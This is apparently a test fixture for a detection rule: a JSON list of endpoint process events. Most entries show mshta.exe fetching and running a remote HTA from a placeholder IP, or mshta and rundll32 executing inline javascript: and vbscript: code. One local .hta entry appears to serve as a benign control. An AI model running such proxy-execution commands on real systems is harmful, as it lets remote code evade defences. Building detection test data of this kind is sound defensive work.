@@ -1,0 +1,47 @@
+[
+  {
+    "Timestamp": "2026-01-01T10:05:00Z",
+    "DeviceName": "host-01",
+    "AccountName": "ana",
+    "FileName": "mshta.exe",
+    "ProcessCommandLine": "mshta.exe https://203.0.113.10/exemplo.hta",
+    "InitiatingProcessFileName": "explorer.exe",
+    "ReportId": 1
+  },
+  {
+    "Timestamp": "2026-01-01T10:05:00Z",
+    "DeviceName": "host-01",
+    "AccountName": "ana",
+    "FileName": "MSHTA.EXE",
+    "ProcessCommandLine": "mshta.exe javascript:close()",
+    "InitiatingProcessFileName": "explorer.exe",
+    "ReportId": 2
+  },
+  {
+    "Timestamp": "2026-01-01T10:05:00Z",
+    "DeviceName": "host-01",
+    "AccountName": "ana",
+    "FileName": "mshta.exe",
+    "ProcessCommandLine": "mshta.exe vbscript:Close",
+    "InitiatingProcessFileName": "explorer.exe",
+    "ReportId": 3
+  },
+  {
+    "Timestamp": "2026-01-01T10:05:00Z",
+    "DeviceName": "host-01",
+    "AccountName": "ana",
+    "FileName": "rundll32.exe",
+    "ProcessCommandLine": "rundll32.exe javascript:exemplo",
+    "InitiatingProcessFileName": "explorer.exe",
+    "ReportId": 4
+  },
+  {
+    "Timestamp": "2026-01-01T10:05:00Z",
+    "DeviceName": "host-01",
+    "AccountName": "ana",
+    "FileName": "mshta.exe",
+    "ProcessCommandLine": "mshta.exe \"C:\\Program Files\\App\\local.hta\"",
+    "InitiatingProcessFileName": "explorer.exe",
+    "ReportId": 100
+  }
+]
